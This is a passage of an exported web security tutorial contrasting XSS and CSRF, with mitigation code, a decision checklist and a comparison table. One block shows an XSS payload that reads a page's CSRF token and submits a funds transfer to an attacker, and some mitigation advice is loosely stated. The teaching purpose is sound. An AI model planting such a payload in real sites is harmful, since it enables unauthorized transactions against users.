+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8001-96dd-c1c7709999c6"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-807b-8824-df465d28499d" class=""><strong>CSRF Mitigation</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-806a-91db-f43a4d9e340f" class=""><strong>1. CSRF Tokens:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8041-94da-d3a7f898d095" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">@app.route(&#x27;/transfer&#x27;, methods=[&#x27;POST&#x27;])
+def transfer():
+    token = request.form.get(&#x27;csrf_token&#x27;)
+    if not validate_csrf_token(token):
+        return &quot;Invalid CSRF token&quot;, 403
+    # Process transfer
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8066-9c9f-ee554e938cf5" class=""><strong>2. SameSite Cookies:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80d4-8fab-cc89e59811e7" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: session=abc123; SameSite=Strict; Secure
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80bd-b54a-c057c5310789" class=""><strong>3. Origin Header Validation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80b7-ad7c-cccffd2510d3" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">if request.headers.get(&#x27;Origin&#x27;) != &#x27;https://example.com&#x27;:
+    return &quot;Invalid origin&quot;, 403
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-807b-b5ee-c5f42114815a"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8046-96b6-e5114458fa9a" class=""><strong>When They Work Together</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-803a-944d-c6ffe3d3ae54" class=""><strong>Combined Attack: XSS + CSRF</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8071-9d52-d2848a99beb7" class=""><strong>Scenario:</strong> XSS vulnerability allows attacker to bypass CSRF protection by reading CSRF token.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-800f-b6b7-c16a2053b4ec" class=""><strong>Attack:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80da-a612-c9622dd40ee5" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// 1. XSS payload reads CSRF token
+var csrf_token = document.querySelector(&#x27;input[name=&quot;csrf_token&quot;]&#x27;).value;
+
+// 2. Use token to perform CSRF attack
+fetch(&#x27;/transfer&#x27;, {
+    method: &#x27;POST&#x27;,
+    body: &#x27;amount=10000&amp;to=attacker&amp;csrf_token=&#x27; + csrf_token
+});
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8042-871f-e5f1cccd582e" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c8-bceb-efe2caf82f82" class="bulleted-list"><li style="list-style-type:disc">Prevent XSS (output encoding)</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8045-9ffe-d05ee26cd11f" class="bulleted-list"><li style="list-style-type:disc">Use HttpOnly cookies for CSRF tokens</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80e7-a398-f41b0479208b" class="bulleted-list"><li style="list-style-type:disc">Additional validation beyond tokens</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8050-9d48-d7767dcac5aa"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8039-8d56-f850d779127a" class=""><strong>Decision Framework</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80d0-a145-fee773ef38c5" class=""><strong>When to Focus on XSS Protection</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-802d-9388-ed0a621322e2" class=""><strong>Focus on XSS if:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80aa-898c-ed1f08fca52d" class="bulleted-list"><li style="list-style-type:disc">Application displays user input</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8000-b0aa-c017ed6493de" class="bulleted-list"><li style="list-style-type:disc">User-generated content is shown</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8083-9938-d325db63978e" class="bulleted-list"><li style="list-style-type:disc">URL parameters reflected in page</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80bf-877a-d7df69759ba4" class="bulleted-list"><li style="list-style-type:disc">Search functionality exists</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80bf-9b8d-f53f2ebe192d" class="bulleted-list"><li style="list-style-type:disc">Comment/forum features present</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80a4-8531-ec1e846ac0d3"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-803f-a71c-da7ff7846a64" class=""><strong>When to Focus on CSRF Protection</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80a0-8ecc-e6357efc008a" class=""><strong>Focus on CSRF if:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-802f-aed3-ed115909f1aa" class="bulleted-list"><li style="list-style-type:disc">State-changing operations exist</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-809c-bff2-c62200d0ea8d" class="bulleted-list"><li style="list-style-type:disc">POST/PUT/DELETE endpoints present</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8031-a22e-f68c8cd6c875" class="bulleted-list"><li style="list-style-type:disc">User authentication required</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8088-b0e0-ec17f4261b2a" class="bulleted-list"><li style="list-style-type:disc">Actions change account settings</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-808d-bbdc-f57a0012b811" class="bulleted-list"><li style="list-style-type:disc">Financial transactions possible</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8033-a3e8-fecb17a767f5"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-809d-b08e-d24d104bfc09" class=""><strong>Always Protect Against Both</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80eb-8fd1-d806728f05b1" class=""><strong>Best Practice:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80fc-b9e7-f1949abe0b46" class="bulleted-list"><li style="list-style-type:disc">Implement XSS protection (output encoding, CSP)</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8054-a0c6-e794a96e2be8" class="bulleted-list"><li style="list-style-type:disc">Implement CSRF protection (tokens, SameSite)</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-805a-9cec-f4ef78ce39f5" class="bulleted-list"><li style="list-style-type:disc">Defense in depth approach</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8029-b604-cad7c0f07c20" class="bulleted-list"><li style="list-style-type:disc">Regular security testing</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8085-9883-c708b57e1ef9"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-80c3-b2da-fa6279790081" class=""><strong>Summary</strong></h2></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d4-baf9-ea78d339d4dd" class=""><strong>XSS and CSRF are different vulnerabilities:</strong></p></div><div style="display:contents" dir="ltr"><table id="2d5562ad-76f0-8056-bc3f-e3e7fa237515" class="simple-table"><thead class="simple-table-header"><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-8044-97fa-ca64f25e1b3a"><th id="Nu&lt;t" class="simple-table-header-color simple-table-header">Aspect</th><th id="tqc@" class="simple-table-header-color simple-table-header">XSS</th><th id="O[uV" class="simple-table-header-color simple-table-header">CSRF</th></tr></div></thead><tbody><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-8054-a056-d5daea4bb1ae"><td id="Nu&lt;t" class=""><strong>Goal</strong></td><td id="tqc@" class="">Execute scripts</td><td id="O[uV" class="">Submit requests</td></tr></div><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-80e0-851a-ef03d69d3bb5"><td id="Nu&lt;t" class=""><strong>Location</strong></td><td id="tqc@" class="">Browser</td><td id="O[uV" class="">Server</td></tr></div><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-8072-bb96-c0ed8624b97c"><td id="Nu&lt;t" class=""><strong>Target</strong></td><td id="tqc@" class="">Other users</td><td id="O[uV" class="">Authenticated users</td></tr></div><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-8008-9ce7-d969d14b3b6d"><td id="Nu&lt;t" class=""><strong>Prevention</strong></td><td id="tqc@" class="">Output encoding</td><td id="O[uV" class="">CSRF tokens</td></tr></div><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-8044-a628-ddbd18e50d94"><td id="Nu&lt;t" class=""><strong>Requires Auth?</strong></td><td id="tqc@" class="">No</td><td id="O[uV" class="">Yes</td></tr></div><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-8017-b84c-fce9f11dd482"><td id="Nu&lt;t" class=""><strong>Attack Vector</strong></td><td id="tqc@" class="">Script injection</td><td id="O[uV" class="">Form submission</td></tr></div></tbody></table></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8065-be25-de17dbb6f761" class=""><strong>Key Takeaway:</strong> Both vulnerabilities must be addressed with appropriate mitigation strategies. Preventing one does not prevent the other.</p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
